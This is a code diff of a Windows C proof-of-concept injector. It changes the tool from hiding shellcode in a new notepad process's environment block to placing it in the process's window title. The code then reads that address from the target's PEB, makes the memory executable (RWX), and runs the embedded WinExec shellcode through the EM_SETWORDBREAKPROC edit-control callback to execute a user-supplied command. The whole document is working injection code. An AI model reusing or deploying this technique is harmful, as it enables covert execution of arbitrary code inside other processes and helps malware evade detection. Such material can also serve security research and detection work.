@@ -30,35 +30,8 @@
 #define UNICODE
 #include "../ntlib/util.h"
 
-#define MAX_VALUE_LEN 32767 // 0x7FFF
-#define MAX_NAME_LEN 16
-
-// return relative virtual address of environment variable value
-DWORD get_var_rva(PWCHAR name) {
-    PVOID  env;
-    PWCHAR str, var;
-    DWORD  rva = 0;
-    
-    // find the offset of value for environment variable
-    env = NtCurrentTeb()->ProcessEnvironmentBlock->ProcessParameters->Environment;
-    str = (PWCHAR)env;
-    
-    while(*str != 0) {
-      // our name?
-      if(wcsncmp(str, name, MAX_NAME_LEN) == 0) {
-        var = wcsstr(str, L"=") + 1;
-        // calculate RVA of value
-        rva = (PBYTE)var - (PBYTE)env;
-        break;
-      }
-      // advance to next entry
-      str += wcslen(str) + 1;
-    }
-    return rva;
-}
-
-// get the address of environment variable value
-PVOID var_get_env(HANDLE hp, PDWORD envlen) {
+// get the address of window title
+PVOID get_win_text(HANDLE hp, PDWORD textlen) {
     NTSTATUS                    nts;
     PROCESS_BASIC_INFORMATION   pbi;
     RTL_USER_PROCESS_PARAMETERS upp;
@@ -76,13 +49,13 @@ PVOID var_get_env(HANDLE hp, PDWORD envlen) {
       hp, pbi.PebBaseAddress,
       &peb, sizeof(PEB), &rd);
     
-    // get the address of Environment block 
+    // get the address of command line 
     ReadProcessMemory(
       hp, peb.ProcessParameters,
       &upp, sizeof(RTL_USER_PROCESS_PARAMETERS), &rd);
 
-    *envlen = upp.EnvironmentSize;
-    return upp.Environment;
+    *textlen = upp.WindowTitle.Length;
+    return upp.WindowTitle.Buffer;
 }
 
 #define WINEXEC_SIZE 197
@@ -167,34 +140,28 @@ char WINEXEC[] = {
   /* 00C4 */ "\xc3"                     /* ret                                     */
 };
 
-void var_inject(PWCHAR cmd) {
+#define NOTEPAD_PATH L"%SystemRoot%\\system32\\notepad.exe"
+
+void win_text_inject(PWCHAR cmd) {
     STARTUPINFO         si;
     PROCESS_INFORMATION pi;
-    WCHAR               name[MAX_PATH]={0};    
+    WCHAR               path[MAX_PATH]={0};    
     INT                 i; 
     PVOID               va;
     DWORD               rva, old, len;
-    PVOID               env;
+    PVOID               win_title;
     HWND                npw, ecw;
 
-    // generate random name
-    srand(time(0));
-    for(i=0; i<MAX_NAME_LEN; i++) {
-      name[i] = ((rand() % 2) ? L'a' : L'A') + (rand() % 26);
-    }
+    ExpandEnvironmentStrings(NOTEPAD_PATH, path, MAX_PATH);
     
-    // set variable in this process space with our shellcode
-    SetEnvironmentVariable(name, (PWCHAR)WINEXEC);
-    
-    // create a new process using 
-    // environment variables from this process
+    // create a new process using shellcode as window title
     ZeroMemory(&si, sizeof(si));
     si.cb          = sizeof(si);
     si.dwFlags     = STARTF_USESHOWWINDOW;
     si.wShowWindow = SW_SHOWDEFAULT;
+    si.lpTitle     = (PWCHAR)WINEXEC;
     
-    // doesn't seem to work if created in suspended mode
-    if(!CreateProcess(NULL, L"notepad", NULL, NULL, 
+    if(!CreateProcess(path, NULL, NULL, NULL, 
       FALSE, 0, NULL, NULL, &si, &pi))
     {
       xstrerror(L"CreateProcess");
@@ -203,7 +170,7 @@ void var_inject(PWCHAR cmd) {
      
     // wait for process to initialize
     // if you don't wait, there can be a race condition
-    // reading the correct Environment address from new process    
+    // reading the correct command line from new process  
     WaitForInputIdle(pi.hProcess, INFINITE);
     
     // the command to execute is just pasted into the notepad
@@ -212,32 +179,29 @@ void var_inject(PWCHAR cmd) {
     ecw = FindWindowEx(npw, NULL, L"Edit", NULL);
     SendMessage(ecw, WM_SETTEXT, 0, (LPARAM)cmd);
     
-    // get the address of environment block in new process
-    // then calculate the address of shellcode
-    env = var_get_env(pi.hProcess, &len);
-    va = (PBYTE)env + get_var_rva(name);
-
-    // set environment block to RWX
-    if(!VirtualProtectEx(pi.hProcess, env, 
+    // get the address of window title in new process
+    // which contains our shellcode
+    win_title = get_win_text(pi.hProcess, &len);
+    
+    // set the address to RWX
+    if(!VirtualProtectEx(pi.hProcess, win_title, 
       len, PAGE_EXECUTE_READWRITE, &old)) {
       xstrerror(L"VirtualProtectEx(RWX)");
       goto cleanup;
     }
     
     // execute shellcode
-    SendMessage(ecw, EM_SETWORDBREAKPROC, 0, (LPARAM)va);
+    SendMessage(ecw, EM_SETWORDBREAKPROC, 0, (LPARAM)win_title);
     SendMessage(ecw, WM_LBUTTONDBLCLK, MK_LBUTTON, (LPARAM)0x000a000a);
     SendMessage(ecw, EM_SETWORDBREAKPROC, 0, (LPARAM)NULL);
     
-    // set environment block to RW
-    if(!VirtualProtectEx(pi.hProcess, env, 
+    // set command line to RW
+    if(!VirtualProtectEx(pi.hProcess, win_title, 
       len, PAGE_READWRITE, &old)) {
       xstrerror(L"VirtualProtectEx(RW)");
     }
 cleanup:
-    // cleanup and exit
-    SetEnvironmentVariable(name, NULL);
-    
+
     if(pi.hProcess != NULL) {
       //TerminateProcess(pi.hProcess, 0);
       CloseHandle(pi.hThread);
@@ -251,11 +215,11 @@ int main(void) {
     
     argv = CommandLineToArgvW(GetCommandLine(), &argc);
     if(argc != 2) {
-      printf("usage: var_inject <command>\n");
+      printf("usage: win_inject <command>\n");
       return 0;
     }
     
-    var_inject(argv[1]);
+    win_text_inject(argv[1]);
     
     return 0;
 }
